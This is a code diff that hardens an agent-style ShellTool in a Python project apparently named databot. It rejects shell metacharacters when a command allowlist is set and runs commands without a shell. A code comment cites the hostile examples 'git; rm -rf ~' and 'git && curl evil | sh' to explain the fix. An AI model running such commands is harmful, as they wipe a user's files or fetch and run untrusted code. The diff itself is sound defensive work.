@@ -4,9 +4,16 @@ from __future__ import annotations
 
 import asyncio
 import os
+import shlex
 from typing import Any
 
 from databot.tools.base import BaseTool
+
+# Shell metacharacters that enable command chaining, substitution, or redirection.
+# When a command allowlist is active these defeat the allowlist (e.g.
+# ``git; rm -rf ~`` or ``git && curl evil | sh``), so they are rejected and the
+# command is executed via argv (no shell) instead of through ``/bin/sh``.
+_SHELL_METACHARACTERS = frozenset(";|&$`><(){}\n\r")
 
 
 class ShellTool(BaseTool):
@@ -50,27 +57,57 @@ class ShellTool(BaseTool):
         }
 
     async def execute(self, command: str) -> str:
-        # Validate allowed commands if configured
+        if not command or not command.strip():
+            return "Error: empty command."
+
+        # When an allowlist is configured, enforce it securely: reject shell
+        # metacharacters (which would let an allowlisted command chain into an
+        # arbitrary one) and execute via argv rather than through a shell.
+        use_shell = True
+        argv: list[str] = []
         if self._allowed_commands:
-            base_cmd = command.strip().split()[0] if command.strip() else ""
-            if base_cmd not in self._allowed_commands:
+            metachar = next((c for c in command if c in _SHELL_METACHARACTERS), None)
+            if metachar is not None:
+                return (
+                    f"Error: shell metacharacter {metachar!r} is not permitted when a "
+                    f"command allowlist is configured. Run a single command without "
+                    f"chaining, pipes, redirection, or substitution."
+                )
+            try:
+                argv = shlex.split(command)
+            except ValueError as e:
+                return f"Error: could not parse command: {e}"
+            if not argv:
+                return "Error: empty command."
+            base_cmd = os.path.basename(argv[0])
+            if base_cmd not in self._allowed_commands and argv[0] not in self._allowed_commands:
                 return (
                     f"Error: Command '{base_cmd}' is not in the allowed list: "
                     f"{self._allowed_commands}"
                 )
+            use_shell = False
 
         try:
             env = os.environ.copy()
             if self._restrict_to_workspace:
                 env["HOME"] = self._working_dir
 
-            proc = await asyncio.create_subprocess_shell(
-                command,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-                cwd=self._working_dir,
-                env=env,
-            )
+            if use_shell:
+                proc = await asyncio.create_subprocess_shell(
+                    command,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    cwd=self._working_dir,
+                    env=env,
+                )
+            else:
+                proc = await asyncio.create_subprocess_exec(
+                    *argv,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    cwd=self._working_dir,
+                    env=env,
+                )
 
             stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=self._timeout)
 
